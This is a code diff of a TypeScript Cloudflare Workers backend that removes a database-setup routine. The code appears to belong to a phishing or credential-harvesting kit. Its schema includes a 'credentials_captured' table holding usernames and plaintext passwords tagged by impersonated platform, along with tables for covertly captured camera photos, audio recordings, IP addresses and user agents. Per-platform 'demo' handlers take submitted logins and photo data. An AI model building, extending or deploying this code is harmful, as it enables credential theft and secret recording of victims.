@@ -14,12 +14,6 @@ const api = new Hono<{ Bindings: CloudflareBindings }>();
 // Enable CORS for the mounted API
 app.use('*', cors());
 api.use('*', cors());
-api.use('*', async (c, next) => {
-  if (c.env.DB) {
-    await initDatabase(c.env.DB);
-  }
-  await next();
-});
 
 const legacyRouteAliases = ['/ms/cyberz', '/ms/cybers'];
 
@@ -68,75 +62,6 @@ const authMiddleware = (c: any, next: any) => {
 };
 
 // ============================================
-// Database initialization
-// ============================================
-const SCHEMA_STATEMENTS = [
-  `CREATE TABLE IF NOT EXISTS sessions (
-    id TEXT PRIMARY KEY,
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    status TEXT DEFAULT 'active',
-    consent_given INTEGER DEFAULT 0,
-    camera_permission INTEGER DEFAULT 0,
-    microphone_permission INTEGER DEFAULT 0,
-    photo_count INTEGER DEFAULT 0,
-    audio_duration_ms INTEGER DEFAULT 0,
-    client_ip TEXT,
-    user_agent TEXT
-  )`,
-  `CREATE TABLE IF NOT EXISTS credentials_captured (
-    id TEXT PRIMARY KEY,
-    session_id TEXT NOT NULL,
-    demo_type TEXT NOT NULL,
-    email_or_username TEXT NOT NULL,
-    password TEXT NOT NULL,
-    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-    photo_id TEXT,
-    FOREIGN KEY (session_id) REFERENCES sessions(id)
-  )`,
-  `CREATE TABLE IF NOT EXISTS photos (
-    id TEXT PRIMARY KEY,
-    session_id TEXT NOT NULL,
-    capture_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-    image_data TEXT,
-    storage_key TEXT,
-    metadata TEXT,
-    FOREIGN KEY (session_id) REFERENCES sessions(id)
-  )`,
-  `CREATE TABLE IF NOT EXISTS audio_recordings (
-    id TEXT PRIMARY KEY,
-    session_id TEXT NOT NULL,
-    recording_data TEXT,
-    duration_ms INTEGER,
-    started_at DATETIME,
-    ended_at DATETIME,
-    FOREIGN KEY (session_id) REFERENCES sessions(id)
-  )`,
-  `CREATE TABLE IF NOT EXISTS admin_audit_log (
-    id TEXT PRIMARY KEY,
-    admin_user TEXT,
-    action TEXT,
-    target_table TEXT,
-    target_count INTEGER,
-    action_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-    notes TEXT
-  )`,
-];
-
-let schemaReady = false;
-
-async function initDatabase(db: D1Database) {
-  if (schemaReady) {
-    return;
-  }
-
-  for (const statement of SCHEMA_STATEMENTS) {
-    await db.prepare(statement).run();
-  }
-  schemaReady = true;
-}
-
-// ============================================
 // Auth Routes
 // ============================================
 api.post('/api/auth/login', async (c) => {
@@ -162,7 +87,6 @@ api.post('/api/sessions/create', async (c) => {
   const userAgent = c.req.header('user-agent') || 'unknown';
 
   try {
-    await initDatabase(db);
     const credId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
 
     await db
@@ -234,8 +158,6 @@ const createDemoHandler = (platform: string) => {
     const { email_or_username, password, photo_data, timestamp } = payload;
 
     try {
-      await initDatabase(db);
-
       const currentSessionId = sessionId || `anonymous_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
       const existingSession = await db
         .prepare(`SELECT 1 FROM sessions WHERE id = ?`)
